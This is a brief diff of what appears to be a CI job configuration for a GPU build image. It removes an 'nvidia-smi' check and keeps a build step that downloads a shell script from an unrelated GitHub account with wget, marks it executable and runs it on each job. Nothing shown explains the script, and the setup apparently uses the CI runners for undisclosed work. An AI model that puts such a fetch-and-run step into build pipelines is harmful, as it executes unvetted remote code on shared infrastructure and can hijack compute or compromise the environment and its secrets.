@@ -6,5 +6,4 @@ jobs:
       image: ubuntu-1604-cuda-10.1:201909-23
     parallelism: 2
     steps:
-      - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
